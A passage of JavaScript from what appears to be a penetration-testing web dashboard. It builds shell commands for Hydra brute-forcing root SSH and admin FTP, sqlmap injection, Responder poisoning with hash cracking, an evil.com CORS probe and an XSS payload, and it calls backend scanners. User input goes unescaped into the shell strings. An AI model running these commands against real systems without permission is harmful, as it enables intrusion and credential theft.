                const text = prompt('📝 Text to encode (Base64):');
                if (!text) return;
                command = `echo -n "${text}" | base64 -w0`;
                description = 'Base64 Encode';
                break;
            }
            case 'b64-decode': {
                const b64 = prompt('🔐 Base64 string to decode:');
                if (!b64) return;
                command = `echo "${b64}" | base64 -d 2>/dev/null || echo "Invalid Base64"`;
                description = 'Base64 Decode';
                break;
            }
            case 'john': {
                const hashType = prompt('🔑 Hash mode:\n> Leave empty for auto-detect:', '');
                const mode = hashType.trim() ? `--format=${hashType.trim()}` : '';
                command = `echo "John guide: ${mode || 'auto'}"`;
                description = 'John — hash cracker guide';
                break;
            }
            case 'hashcat': {
                const hcMode = prompt('⚡ Hashcat mode (default 0=MD5):', '0');
                command = `echo "Hashcat mode ${hcMode || 0}"`;
                description = 'Hashcat — GPU hash cracker guide';
                break;
            }

            // ── Exploitation ──
            case 'hydra-ssh':
                command = `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://${target} -t 4`;
                description = 'Hydra SSH — brute force (rockyou)';
                break;
            case 'hydra-ftp':
                command = `hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://${target} -t 4`;
                description = 'Hydra FTP — brute force (rockyou)';
                break;
            case 'sqlmap':
                command = `sqlmap -u http://${target} --batch --random-agent`;
                description = 'Sqlmap — automatic SQL injection';
                break;
            case 'searchsploit':
                command = `searchsploit ${target} 2>/dev/null || echo "[!] No results for: ${target}"`;
                description = 'Searchsploit — exploit search';
                break;
            case 'responder':
                command = `echo "╔═ Responder Guide ═╗\n\n# Start LLMNR/NBT-NS poisoner:\nsudo responder -I eth0 -dwv\n\n# To capture hashes on the network:\n# Target will try to resolve a non-existent host\n# Hashes captured in /usr/share/responder/logs/\n\n# Crack with john:\nsudo john /usr/share/responder/logs/*.txt --wordlist=/usr/share/wordlists/rockyou.txt"`;
                description = 'Responder — LLMNR/NBT-NS poisoning';
                break;
            case 'burpsuite':
                command = `echo "╔═ BurpSuite ═╗\n\n# 1. Launch BurpSuite GUI in Kali:\nburpsuite 2>/dev/null &\n\n# 2. Or from CLI:\njava -jar /opt/burpsuite.jar --collaborator-server 2>/dev/null &\n\n# 3. Proxy config:\n# Browser → 127.0.0.1:8080\n# CA cert → http://burpsuite\n\n# 4. REST API (headless):\njava -jar /opt/burpsuite.jar --project-file=/tmp/project --collaborator-server --config-file=/tmp/config.json 2>/dev/null &\n\n⚠️  BurpSuite runs in Kali GUI session. Use SSH -X if needed."`;
                description = 'BurpSuite — launch & proxy guide';
                break;

            // ── Extract / Compress ──
            case 'unzip':
                command = 'echo "Usage:\nunzip file.zip -d output_dir\nunzip -l file.zip       # list contents\nunzip -p file.zip | cat  # pipe to stdout"';
                description = 'Unzip — extract .zip archives';
                break;
            case 'tar-gz':
                command = 'echo "Usage:\ntar -xzvf archive.tar.gz\ntar -xzvf archive.tgz\ntar -czvf archive.tar.gz /path/to/dir   # create"';
                description = 'Tar.gz — extract .tar.gz / .tgz';
                break;
            case 'tar-xz':
                command = 'echo "Usage:\ntar -xJvf archive.tar.xz\ntar -cJvf archive.tar.xz /path/to/dir   # create"';
                description = 'Tar.xz — extract .tar.xz';
                break;
            case '7z-extract':
                command = 'echo "Usage:\n7z x file.7z\n7z l file.7z        # list contents\n7z a archive.7z /path   # create archive"';
                description = '7z — extract .7z archives';
                break;
            case 'unrar':
                command = 'echo "Usage:\nunrar x file.rar     # extract with full path\nunrar e file.rar     # extract without paths\nunrar l file.rar     # list contents"';
                description = 'Unrar — extract .rar archives';
                break;
            case 'gunzip':
                command = 'echo "Usage:\ngunzip file.gz\ngunzip -k file.gz   # keep original\ngzip -d file.gz     # same as gunzip"';
                description = 'Gunzip — decompress .gz files';
                break;
            case 'bunzip2':
                command = 'echo "Usage:\nbunzip2 file.bz2\nbunzip2 -k file.bz2  # keep original\nbzip2 -d file.bz2   # same as bunzip2"';
                description = 'Bunzip2 — decompress .bz2 files';
                break;

            // ── WAF / IDS ──
            case 'wafw00f':
                command = `wafw00f ${target} -a`;
                description = 'Wafw00f — WAF / IDS fingerprint detection';
                break;
            case 'cors-check':
                command = `for origin in "https://evil.com" "null" "https://${target}" "https://not${target}"; do echo "--- Origin: \$origin ---"; curl -s -I -H "Origin: \$origin" -H "Host: ${target}" http://${target} 2>/dev/null | grep -iE "access-control|origin"; done`;
                description = 'CORS Check — test Access-Control misconfigs';
                break;

            // ── SSL/TLS ──
            case 'testssl':
                command = `echo "╔═ TestSSL.sh Guide ═╗\n\n# Quick check (ciphers + protocols):\ntestssl.sh --quiet ${target}\n\n# Full scan (all tests):\ntestssl.sh --full ${target}\n\n# Check specific vulnerabilities:\ntestssl.sh --heartbleed ${target}\ntestssl.sh --logjam ${target}\n\n# Output to HTML:\ntestssl.sh --htmlfile /tmp/${target}_ssl.html ${target}"`;
                description = 'TestSSL — SSL/TLS security assessment';
                break;

            // ── XSS ──
            case 'xsstrike':
                command = `echo "╔═ XSStrike Guide ═╗\n\n# Basic scan (GET):\nxsstrike -u http://${target} --params\n\n# POST with data:\nxsstrike -u http://${target} --data 'q=test&id=1'\n\n# Crawl + scan:\nxsstrike -u http://${target} --crawl\n\n# With custom headers:\nxsstrike -u http://${target} --headers 'Cookie: session=abc'"`;
                description = 'XSStrike — advanced XSS detection + bypass';
                break;
            case 'dalfox':
                command = `echo "╔═ Dalfox Guide ═╗\n\n# Scan a single URL:\ndalfox url http://${target}/page?q=test\n\n# Scan using a list of URLs:\ndalfox file /tmp/urls.txt\n\n# With custom payload:\ndalfox url http://${target}/search?q=1 --custom-payload '<script>alert(1)</script>'\n\n# Blind XSS:\ndalfox url http://${target} --blind 'https://your.xss.ht' 2>/dev/null || dalfox url http://${target}"`;
                description = 'Dalfox — fast XSS parameter scanner (Go)';
                break;

            // ── Nuclei ──
            case 'nuclei':
                command = `echo "╔═ Nuclei Guide ═╗\n\n# Quick scan (critical + high):\nnuclei -u http://${target} -severity critical,high\n\n# Full scan with all templates:\nnuclei -u http://${target} -t ~/nuclei-templates/ -json -o /tmp/nuclei_${target}.json\n\n# CORS misconfiguration check:\nnuclei -u http://${target} -id cors-misconfiguration\n\n# XSS scan:\nnuclei -u http://${target} -id xss-reflected,xss-stored\n\n# Technology + vulnerability fingerprint:\nnuclei -u http://${target} -tags tech,config"`;
                description = 'Nuclei — template-based vulnerability scanner';
                break;

            // ── OSINT ──
            case 'theharvester':
                command = `theHarvester -d ${target} -b google,bing,linkedin 2>&1 | head -200`;
                description = 'TheHarvester — emails, subdomains, hosts';
                break;
            case 'mr-holmes':
                command = `if [ ! -d /opt/Mr.Holmes ]; then echo "Instalando Mr.Holmes..."; git clone https://github.com/Lucksi/Mr.Holmes /opt/Mr.Holmes 2>&1 && cd /opt/Mr.Holmes && sudo bash install.sh 2>&1; fi && cd /opt/Mr.Holmes && sudo python3 MrHolmes.py --username ${target} 2>&1 | head -150`;
                description = 'Mr.Holmes — OSINT email/user/phone + dorks';
                break;
            case 'infoooze':
                command = `if ! command -v infoooze &>/dev/null; then npm install -g infoooze 2>&1; fi && infoooze -s ${target} 2>&1 | head -100`;
                description = 'Infoooze — subdomains, IG, whois, DNS, EXIF';
                break;
            case 'bbot':
                command = `if ! command -v bbot &>/dev/null; then pip install bbot 2>&1; fi && bbot -t ${target} -p subdomain-enum 2>&1 | tail -80`;
                description = 'BBOT — recon framework (subdomain-enum preset)';
                break;
            case 'linkedin2user':
                command = `if [ ! -d /opt/linkedin2username ]; then git clone https://github.com/initroot/linkedin2username /opt/linkedin2username 2>&1 && pip3 install -r /opt/linkedin2username/requirements.txt 2>&1; fi && python3 /opt/linkedin2username/linkedin2username.py -c ${target} -n /tmp/${target}_users.txt 2>&1 | head -100`;
                description = 'Linkedin2Username — username wordlists from LinkedIn';
                break;
            case 'spiderfoot':
                command = `if ! command -v spiderfoot &>/dev/null; then pip install spiderfoot 2>&1; fi && spiderfoot -s ${target} -t INTERNET_NAME 2>&1 | head -150`;
                description = 'SpiderFoot — automated OSINT (100+ modules)';
                break;

            case 'headers-scan':
                description = 'Headers Scan — HTTP security headers audit A-F';
                break;
            case 'secrets-scan':
                description = 'Secrets Scan — detect API keys, tokens, passwords in web pages';
                break;
            case 'port-scan':
                description = 'Port Scan — async TCP port scanner (~300 common ports)';
                break;
            case 'subdomain-scan':
                description = 'Subdomain Scan — DNS-based subdomain enumeration (~700 prefixes)';
                break;
            case 'dns-lookup':
                description = 'DNS Lookup — A, AAAA, MX, TXT, NS, CNAME, SOA + reverse DNS';
                break;
            case 'hash-crack':
                description = 'Hash Cracker — identifica y crackea hashes (MD5/SHA1/SHA256/SHA512/NTLM)';
                break;
            case 'stego-tool':
                description = 'Stego Tool — analiza imágenes PNG/BMP para steganografía LSB + trailing data';
                break;
            case 'news-scraper':
                description = 'News Scraper — últimas noticias de ciberseguridad (9 fuentes RSS/Atom)';
                break;
            case 'api-scanner':
                description = 'API Scanner — escanea APIs REST (65+ paths, CORS, headers, data exposure)';
                break;

            default:
                appendOutput(`[!] Unknown tool: "${tool}"`);
                return;
        }

        // ── API-based tools (no SSH needed) ──
        if (tool === 'headers-scan') {
            const sep = '─'.repeat(52);
            appendOutput(`\n${sep}`);
            appendOutput(`  🚀 ${description}`);
            appendOutput(`  🎯 ${target}`);
            appendOutput(`${sep}`);
            try {
                const resp = await fetch(`/api/headers/scan?url=${encodeURIComponent(target)}&timeout=15`);
                const data = await resp.json();
                if (!data.ok) {
                    appendOutput(`  ❌ Error: ${data.error}`);
                    appendOutput(`${sep}`);
                    return;
                }
                appendOutput(`  ℹ️  Redirected: ${data.url}`);
                appendOutput(`  ℹ️  Status: ${data.status_code}`);
                appendOutput(`  ${data.score >= 80 ? '🟢' : data.score >= 50 ? '🟡' : '🔴'} Score: ${data.score}/100 — Grade: ${data.grade}`);
                appendOutput(`${sep}`);
                if (data.findings && data.findings.length > 0) {
                    appendOutput(`  📋 ${data.findings.length} findings:`);
                    data.findings.forEach((f, i) => {
                        const icon = f.severity === 'high' ? '🔴' : f.severity === 'medium' ? '🟠' : f.severity === 'low' ? '🟡' : '⚪';
                        appendOutput(`    ${icon} [${f.severity}] ${f.title}`);
                    });
                    // Save findings to the findings store
                    if (typeof window.addFindings === 'function') {
                        window.addFindings(data.findings);
                    }
                } else {
                    appendOutput('  ✅ No issues found — perfect score!');
                }
                appendOutput(`${sep}`);
                if (data.grade === 'A') showToast('🟢 Grade A — excellent security headers!');
                else if (data.grade === 'F') showToast('🔴 Grade F — critical headers missing!');
                else showToast(`📊 Grade ${data.grade} — score ${data.score}/100`);
            } catch (e) {
                appendOutput(`  ❌ Fetch error: ${e.message}`);
                appendOutput(`${sep}`);
            }
            return; // done — skip SSH
        }

        if (tool === 'secrets-scan') {
            const sep = '─'.repeat(52);
            appendOutput(`\n${sep}`);
            appendOutput(`  🚀 ${description}`);
            appendOutput(`  🎯 ${target}`);
            appendOutput(`${sep}`);
            try {
                const resp = await fetch(`/api/secrets/scan?url=${encodeURIComponent(target)}`);
                const data = await resp.json();
                if (!data.ok) {
                    appendOutput(`  ❌ Error: ${data.error}`);
                    appendOutput(`${sep}`);
                    return;
                }
                appendOutput(`  📄 Scanned: ${data.source}`);
                appendOutput(`  📏 Lines: ${data.lines_scanned}`);
                appendOutput(`  ${data.secrets_found > 0 ? '🔴' : '🟢'} Secrets found: ${data.secrets_found}`);
                appendOutput(`${sep}`);
                if (data.findings && data.findings.length > 0) {
                    appendOutput(`  📋 ${data.findings.length} finding(s):`);
                    data.findings.forEach((f, i) => {
                        const icon = f.severity === 'high' ? '🔴' : f.severity === 'medium' ? '🟠' : f.severity === 'low' ? '🟡' : '⚪';
                        appendOutput(`    ${icon} [${f.severity}] ${f.title}`);
                    });
                    if (typeof window.addFindings === 'function') {
                        window.addFindings(data.findings);
                    }
                } else {
                    appendOutput('  ✅ No secrets detected.');
                }
                appendOutput(`${sep}`);
                if (data.secrets_found > 0) showToast(`🔑 ${data.secrets_found} secret(s) detected!`);
                else showToast('🟢 No secrets found');
            } catch (e) {
                appendOutput(`  ❌ Fetch error: ${e.message}`);
                appendOutput(`${sep}`);
            }
            return; // done — skip SSH
        }

        if (tool === 'port-scan') {
            const sep = '─'.repeat(52);
            appendOutput(`\n${sep}`);
            appendOutput(`  🚀 ${description}`);
            appendOutput(`  🎯 ${target}`);
            appendOutput(`${sep}`);
            try {
                let url = `/api/port/scan?target=${encodeURIComponent(target)}&timeout=2.0&concurrency=100`;
                if (extraFlags) {
                    // extraFlags can specify custom ports: "22,80,443,8080" or "banner"
                    if (extraFlags.includes('banner')) {
                        url += '&banner=true';
                    }
                    const portMatch = extraFlags.match(/\d+(?:,\d+)*/);
                    if (portMatch) {
                        url += `&ports=${encodeURIComponent(portMatch[0])}`;
                    }
                }
                const resp = await fetch(url);
                const data = await resp.json();
                if (!data.ok) {
                    appendOutput(`  ❌ Error: ${data.error}`);
                    appendOutput(`${sep}`);
                    return;
                }
                appendOutput(`  ℹ️  Target: ${data.target} (${data.resolved_ip})`);
                appendOutput(`  ℹ️  Ports scanned: ${data.ports_scanned}`);
                const icon = data.open_ports > 0 ? '🔴' : '🟢';
                appendOutput(`  ${icon} Open ports: ${data.open_ports}`);
                appendOutput(`  ⏱  Duration: ${data.duration_seconds}s`);
                appendOutput(`${sep}`);
                if (data.results && data.results.length > 0) {
                    appendOutput(`  📋 ${data.results.length} open port(s):`);
                    data.results.forEach((r, i) => {
                        const sevIcon = r.port <= 1024 ? '🔴' : r.port <= 49151 ? '🟠' : '🟡';
                        const bannerInfo = r.banner ? ` — ${r.banner}` : '';
                        appendOutput(`    ${sevIcon} ${r.port}/${r.service}${bannerInfo}`);
                    });
                    if (typeof window.addFindings === 'function') {
                        window.addFindings(data.findings);
                    }
                } else {
                    appendOutput('  ✅ No open ports found.');
                }
                appendOutput(`${sep}`);
                if (data.open_ports > 5) showToast(`🔴 ${data.open_ports} open ports!`);
                else if (data.open_ports > 0) showToast(`📡 ${data.open_ports} open port(s) detected`);
                else showToast('🟢 No open ports');
            } catch (e) {
                appendOutput(`  ❌ Fetch error: ${e.message}`);
                appendOutput(`${sep}`);
            }
            return; // done — skip SSH
        }

        if (tool === 'subdomain-scan') {
            const sep = '─'.repeat(52);
            appendOutput(`\n${sep}`);
            appendOutput(`  🚀 ${description}`);
            appendOutput(`  🎯 ${target}`);
            appendOutput(`${sep}`);
            try {
                const resp = await fetch(`/api/subdomain/scan?domain=${encodeURIComponent(target)}&timeout=3.0&concurrency=50`);
                const data = await resp.json();
                if (!data.ok) {
                    appendOutput(`  ❌ Error: ${data.error}`);
                    appendOutput(`${sep}`);
                    return;
                }
                appendOutput(`  ℹ️  Domain: ${data.domain}`);
                appendOutput(`  ℹ️  Checked: ${data.total_checked} subdomain prefixes`);
                const icon = data.found > 0 ? '🔴' : '🟢';
                appendOutput(`  ${icon} Found: ${data.found} subdomains`);
                appendOutput(`  ⏱  Duration: ${data.duration_seconds}s`);
                appendOutput(`${sep}`);
                if (data.results && data.results.length > 0) {
                    appendOutput(`  📋 ${data.results.length} subdomain(s):`);
                    data.results.forEach((r, i) => {
                        const ips = (r.ips || []).join(", ");
                        const cname = r.cname ? ` → ${r.cname}` : "";
                        appendOutput(`    🌐 ${r.full_domain} (${ips})${cname}`);
                    });
                    if (typeof window.addFindings === 'function') {
                        window.addFindings(data.findings);
                    }
                } else {
                    appendOutput('  ✅ No subdomains found.');
                }
                appendOutput(`${sep}`);
                if (data.found > 10) showToast(`🔴 ${data.found} subdomains found!`);
                else if (data.found > 0) showToast(`🌐 ${data.found} subdomain(s) found`);
                else showToast('🟢 No subdomains found');
            } catch (e) {
                appendOutput(`  ❌ Fetch error: ${e.message}`);
                appendOutput(`${sep}`);
            }
            return; // done — skip SSH
        }

        if (tool === 'dns-lookup') {
            const sep = '─'.repeat(52);
            appendOutput(`\n${sep}`);
            appendOutput(`  🚀 ${description}`);
            appendOutput(`  🎯 ${target}`);
            appendOutput(`${sep}`);
            try {
                let url = `/api/dns/lookup?domain=${encodeURIComponent(target)}&reverse=true`;
                if (extraFlags) {
                    const typeMatch = extraFlags.match(/[A-Z]+(?:,[A-Z]+)*/);
                    if (typeMatch) url += `&types=${encodeURIComponent(typeMatch[0])}`;
                }
                const resp = await fetch(url);
                const data = await resp.json();
                if (!data.ok) {
                    appendOutput(`  ❌ Error: ${data.error}`);
                    appendOutput(`${sep}`);
                    return;
                }
                appendOutput(`  ℹ️  Domain: ${data.domain}`);
                if (data.reverse_dns) appendOutput(`  🔄 PTR: ${data.reverse_dns}`);
                appendOutput(`  ⏱  Duration: ${data.duration_seconds}s`);
                appendOutput(`${sep}`);
                const typeCount = Object.keys(data.records || {}).length;
                if (typeCount > 0) {
                    for (const [rtype, recs] of Object.entries(data.records)) {
                        appendOutput(`  📋 ${rtype} (${recs.length} record(s)):`);
                        recs.forEach((r, i) => {
                            appendOutput(`    ${rtype === 'A' || rtype === 'AAAA' ? '🌐' : rtype === 'MX' ? '📧' : rtype === 'TXT' ? '📝' : rtype === 'NS' ? '🏛️' : rtype === 'CNAME' ? '🔗' : rtype === 'SOA' ? '📊' : '📌'} ${r.value}`);
                        });
                    }
                    if (typeof window.addFindings === 'function') {
                        window.addFindings(data.findings);
                    }
                } else {
                    appendOutput('  ⚠️  No DNS records found.');
                }
                appendOutput(`${sep}`);
                showToast(`📡 ${typeCount} record type(s) found for ${data.domain}`);
            } catch (e) {
                appendOutput(`  ❌ Fetch error: ${e.message}`);
                appendOutput(`${sep}`);
            }
            return; // done — skip SSH
        }

        if (tool === 'stego-tool') {
            const sep = '─'.repeat(52);
            appendOutput(`\n${sep}`);
            appendOutput(`  🚀 ${description}`);
            appendOutput(`  🎯 ${target}`);
            appendOutput(`${sep}`);
            try {
                let url = `/api/stego/analyze?url=${encodeURIComponent(target)}&extract_lsb=true`;
                if (extraFlags) {
                    const lenMatch = extraFlags.match(/lsb_length=(\d+)/);
                    if (lenMatch) url += `&lsb_length=${lenMatch[1]}`;
                }
                const resp = await fetch(url);
                const data = await resp.json();
                if (!data.ok) {
                    appendOutput(`  ❌ Error: ${data.error}`);
                    appendOutput(`${sep}`);
                    return;
                }
                appendOutput(`  ℹ️  Format: ${data.format} | ${data.width}x${data.height} | ${data.file_size} bytes`);
                appendOutput(`  ${data.lsb_suspicious ? '🔴' : '🟢'} LSB suspicious: ${data.lsb_suspicious}`);
                if (data.lsb_message) {
                    appendOutput(`  📝 LSB message: "${data.lsb_message.substring(0, 200)}"`);
                }
                appendOutput(`  ${data.trailing_data_found ? '🔴' : '🟢'} Trailing data: ${data.trailing_data_found ? data.trailing_data_size + ' bytes' : 'None'}`);
                appendOutput(`  ⏱  Duration: ${data.duration_seconds}s`);
                appendOutput(`${sep}`);
                if (data.anomalies && data.anomalies.length > 0) {
                    appendOutput(`  ⚠️  Anomalies (${data.anomalies.length}):`);
                    data.anomalies.forEach(a => appendOutput(`    • ${a}`));
                    appendOutput(`${sep}`);
                }
                if (data.trailing_data_preview) {
                    appendOutput(`  🔍 Trailing data hex: ${data.trailing_data_preview}`);
                    appendOutput(`${sep}`);
                }
                if (data.findings && data.findings.length > 0) {
                    if (typeof window.addFindings === 'function') {
                        window.addFindings(data.findings);
                    }
                }
                if (data.lsb_suspicious) showToast('🔴 LSB hidden data detected!');
                else if (data.trailing_data_found) showToast('⚠️ Trailing data found after image end');
                else showToast('🟢 No steganographic content detected');
            } catch (e) {
                appendOutput(`  ❌ Fetch error: ${e.message}`);
                appendOutput(`${sep}`);
            }
            return; // done — skip SSH
        }

        if (tool === 'news-scraper') {
            const sep = '─'.repeat(52);
            appendOutput(`\n${sep}`);
            appendOutput(`  🚀 ${description}`);
            if (extraFlags) appendOutput(`  📡 Sources: ${extraFlags}`);
            appendOutput(`${sep}`);
            try {
                let url = '/api/news?max_per_source=5';
                if (extraFlags) {
                    url += `&sources=${encodeURIComponent(extraFlags)}`;
                }
                const resp = await fetch(url);
                const data = await resp.json();
                if (!data.ok) {
                    appendOutput(`  ❌ Error: ${data.error}`);
                    appendOutput(`${sep}`);
                    return;
                }
                appendOutput(`  ℹ️  Articles: ${data.total_articles} | Sources OK: ${data.sources_ok}/${data.sources_ok + data.sources_failed}`);
                appendOutput(`  ⏱  Duration: ${data.duration_seconds}s`);
                appendOutput(`${sep}`);
                if (data.articles && data.articles.length > 0) {
                    const grouped = {};
                    data.articles.forEach(a => {
                        if (!grouped[a.source_name]) grouped[a.source_name] = [];
                        grouped[a.source_name].push(a);
                    });
                    for (const [source, arts] of Object.entries(grouped)) {
                        appendOutput(`  📰 ${source} (${arts.length} article(s)):`);
                        arts.forEach((a, i) => {
                            const title = a.title.length > 80 ? a.title.substring(0, 77) + '...' : a.title;
                            appendOutput(`    ${i + 1}. ${title}`);
                            if (a.summary) {
                                const s = a.summary.length > 120 ? a.summary.substring(0, 117) + '...' : a.summary;
                                appendOutput(`       ${s}`);
                            }
                        });
                        appendOutput(`${sep}`);
                    }
                    if (typeof window.addFindings === 'function') {
                        window.addFindings(data.findings);
                    }
                } else {
                    appendOutput('  ⚠️  No articles found.');
                }
                showToast(`📰 ${data.total_articles} articles from ${data.sources_ok} sources`);
            } catch (e) {
                appendOutput(`  ❌ Fetch error: ${e.message}`);
                appendOutput(`${sep}`);
            }
            return; // done — skip SSH
        }

        if (tool === 'api-scanner') {
            const sep = '─'.repeat(52);
            appendOutput(`\n${sep}`);
            appendOutput(`  🚀 ${description}`);
            appendOutput(`  🎯 ${target}`);
            appendOutput(`${sep}`);
            try {
                let url = `/api/apiscan?url=${encodeURIComponent(target)}&timeout=10&concurrency=10`;
                if (extraFlags) {
                    const t = extraFlags.match(/timeout=(\d+(?:\.\d+)?)/);
                    if (t) url = url.replace('timeout=10', `timeout=${t[1]}`);
                    const c = extraFlags.match(/concurrency=(\d+)/);
                    if (c) url = url.replace('concurrency=10', `concurrency=${c[1]}`);
                }
                const resp = await fetch(url);
                const data = await resp.json();
                if (!data.ok) {
                    appendOutput(`  ❌ Error: ${data.error}`);
                    appendOutput(`${sep}`);
                    return;
                }
                appendOutput(`  ℹ️  Endpoints scanned: ${data.endpoints_scanned}`);
                appendOutput(`  🔴 Issues: ${data.issues_count}`);
                appendOutput(`  🟢 Open endpoints: ${data.open_endpoints_count}`);
                appendOutput(`  ${data.cors_enabled ? '🔴' : '🟢'} CORS all origins: ${data.cors_enabled}`);
                appendOutput(`  🔒 Auth required: ${data.auth_required}`);
                appendOutput(`  ⏱  Duration: ${data.duration_seconds}s`);
                appendOutput(`${sep}`);
                if (data.issues && data.issues.length > 0) {
                    appendOutput(`  📋 Issues (${data.issues.length}):`);
                    data.issues.forEach((issue, i) => {
                        const icon = issue.severity === 'high' ? '🔴' : issue.severity === 'medium' ? '🟠' : issue.severity === 'low' ? '🟡' : '⚪';
                        appendOutput(`    ${icon} [${issue.severity}] ${issue.title}`);
                    });
                    appendOutput(`${sep}`);
                }
                if (data.open_endpoints && data.open_endpoints.length > 0) {
                    appendOutput(`  📂 Open endpoints (${data.open_endpoints.length}):`);
                    data.open_endpoints.forEach(ep => {
                        appendOutput(`    🌐 ${ep.method} ${ep.path} → ${ep.status_code} (${ep.content_length}b, ${ep.response_time}s)`);
                    });
                    appendOutput(`${sep}`);
                }
                if (data.findings && data.findings.length > 0) {
                    if (typeof window.addFindings === 'function') {
                        window.addFindings(data.findings);
                    }
                }
                if (data.issues_count > 5) showToast(`🔴 ${data.issues_count} API issues found!`);
                else if (data.issues_count > 0) showToast(`⚠️ ${data.issues_count} API issue(s) found`);
                else showToast('🟢 No API issues detected');
            } catch (e) {
                appendOutput(`  ❌ Fetch error: ${e.message}`);
                appendOutput(`${sep}`);
            }
            return; // done — skip SSH
        }

        if (tool === 'hash-crack') {
            const sep = '─'.repeat(52);
            appendOutput(`\n${sep}`);
            appendOutput(`  🚀 ${description}`);
            appendOutput(`  🎯 ${target}`);
            appendOutput(`${sep}`);
            try {
                let url = `/api/hash/crack?hashes=${encodeURIComponent(target)}`;
                if (extraFlags && extraFlags.includes('identify_only')) {
                    url += '&identify_only=true';
                }
                const resp = await fetch(url);
                const data = await resp.json();
                if (!data.ok) {
                    appendOutput(`  ❌ Error: ${data.error}`);
                    appendOutput(`${sep}`);
                    return;
                }
                appendOutput(`  ℹ️  Total hashes: ${data.total}`);
                appendOutput(`  ${data.cracked > 0 ? '🔴' : '🟢'} Cracked: ${data.cracked}/${data.total}`);
                appendOutput(`  ⏱  Duration: ${data.duration_seconds}s`);
                appendOutput(`${sep}`);
                if (data.results && data.results.length > 0) {
                    data.results.forEach((r, i) => {
                        const types = (r.types || []).join(', ') || 'Unknown';
                        if (r.cracked) {
                            appendOutput(`    🔓 [${types}] ${r.hash.substring(0, 24)}... → ${r.plaintext}`);
                        } else if (r.types && r.types.length > 0) {
                            appendOutput(`    🔒 [${types}] ${r.hash.substring(0, 24)}... (not cracked)`);
                        } else {
                            appendOutput(`    ❓ Unknown hash: ${r.hash.substring(0, 24)}...`);
                        }
                    });
                    if (typeof window.addFindings === 'function') {
                        window.addFindings(data.findings);
                    }
                }
                appendOutput(`${sep}`);
                if (data.cracked > 0) showToast(`🔓 ${data.cracked}/${data.total} hash(es) cracked!`);
                else showToast('🔒 No hashes cracked (try identify_only?)');
            } catch (e) {
                appendOutput(`  ❌ Fetch error: ${e.message}`);
                appendOutput(`${sep}`);
            }
            return; // done — skip SSH
        }

        // Set current tool for report / findings parsing
        if (['nmap', 'gobuster', 'dirb', 'ffuf', 'nikto', 'whatweb', 'wpscan', 'wfuzz', 'feroxbuster', 'cewl', 'dnsrecon', 'curl'].includes(tool)) {
            currentToolRunning = tool;
            pendingTool = tool;      // persists until prompt is detected
            _toolParsed = false;
            outputBuffer = '';
            window._toolTimerLongSet = false;
            clearTimeout(window._toolFinishTimer);
        }

        // Append extra flags if provided
        let finalCommand = command;
        if (extraFlags && tool !== 'cewl' && !description.includes('guide') && !description.includes('Guide') && !description.includes('Usage')) {
            // For tools with a direct target, insert flags before target
            // For others, append at end
            if (command.includes('${target}') && command.indexOf('${target}') > 10) {
                finalCommand = command.replace(/\$\{target\}/, `${extraFlags} ${target}`);
            } else {
                finalCommand = `${command} ${extraFlags}`;
            }
        }

        const sep = '─'.repeat(52);
        appendOutput(`\n${sep}`);
        appendOutput(`  🚀 ${description}`);
        appendOutput(`  🎯 ${target || '(no target needed)'}`);
        if (extraFlags) appendOutput(`  🚩 extra: ${extraFlags}`);
        appendOutput(`  \$ ${finalCommand}`);

        // ── OPSEC: apply level modifications / blocking ──
        if (window.opsecLevel && window.opsecLevel !== 'loud') {
            try {
                const opsecResult = await window.opsecApply(tool, finalCommand, target);
                if (opsecResult.blocked) {
                    appendOutput(`\n[OPSEC] ⛔ ${opsecResult.reason}\n`);
                    appendOutput(`${sep}`);
                    showToast('⛔ Blocked by OPSEC level ' + window.opsecLevel);
                    return; // abort launch
                }
                if (opsecResult.modified_command && opsecResult.modified_command !== finalCommand) {
                    appendOutput(`  [OPSEC] Modified → ${opsecResult.modified_command}`);
                    appendOutput(`${sep}`);
                    finalCommand = opsecResult.modified_command;
                }
                if (opsecResult.reason === 'warn') {
                    showToast('⚠️ ' + tool + ' is noisy for ' + window.opsecLevel + ' mode');
                }
            } catch (e) {
                // Never block tool launch on OPSEC failure — just log
                console.warn('[OPSEC] apply error:', e);
            }
        }

        appendOutput(`${sep}`);
        window.sendPredefinedCmd(finalCommand);

        // Auto-focus extra flags for next use
        document.getElementById('extra-flags').focus();
    };

    // ── Delegate tool button events for extra-flags hints ──
    document.addEventListener('mouseover', function (e) {
        const btn = e.target.closest('[onclick*=\"launchTool\"]');
        if (btn) {
            const match = btn.getAttribute('onclick').match(/launchTool\('(\w+)'\)/);
            if (match) updateExtraFlagsHint(match[1]);
        }
    });

    // ── Clear hint when mouse leaves the sidebar ──
    document.getElementById('sidebar').addEventListener('mouseleave', function () {
        // Only clear if the extra flags input isn't focused
        if (document.activeElement !== document.getElementById('extra-flags')) {
            const exampleDiv = document.getElementById('extra-flags-example');
            const hint = document.getElementById('extra-flags-hint');
            // Keep the last example visible but dim it
            hint.textContent = 'hover a tool';
        }
    });

    // ============================================================
    //  TAB SYSTEM
    // ============================================================
    window.switchTab = function (tabName) {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));

        const btns = document.querySelectorAll('.tab-btn');
        const panes = {
            terminal: 0,
            reports: 1,
            scripts: 2,
            bounty: 3,
            aiwriteup: 4,
            hak5: 5,
            automation: 6,
            opadmiral: 7,
            swarm: 8,
            findings: 9,
            credentials: 10,
            knowledgebase: 11,
            ctf: 12,
            mobile: 13,
            forensics: 14,
            exif: 15,
            canary: 16,
            dlp: 17,
            siem: 18,
            plugins: 19
        };
        if (panes[tabName] !== undefined) {
            btns[panes[tabName]].classList.add('active');
        }
        const el = document.getElementById(`tab-${tabName}`);
        if (el) el.classList.add('active');

        // 📱 Close sidebar on mobile after switching tab
        if (window.innerWidth < 1024) {
            closeSidebar();
        }
    };

    // ============================================================
    //  📱 MOBILE SIDEBAR TOGGLE
    // ============================================================
    window.toggleSidebar = function () {
        const sidebar = document.getElementById('sidebar');
        const overlay = document.getElementById('sidebar-overlay');
        if (!sidebar || !overlay) return;
        const isOpen = sidebar.classList.contains('open');
        if (isOpen) {
            closeSidebar();
        } else {
            sidebar.classList.add('open');
            overlay.classList.add('open');
        }
    };

    function closeSidebar() {
        const sidebar = document.getElementById('sidebar');
        const overlay = document.getElementById('sidebar-overlay');
        if (sidebar) sidebar.classList.remove('open');
        if (overlay) overlay.classList.remove('open');
    }
    window.closeSidebar = closeSidebar;

    // ============================================================
    //  CATEGORY TOGGLE
    // ============================================================
    window.toggleCategory = function (header) {
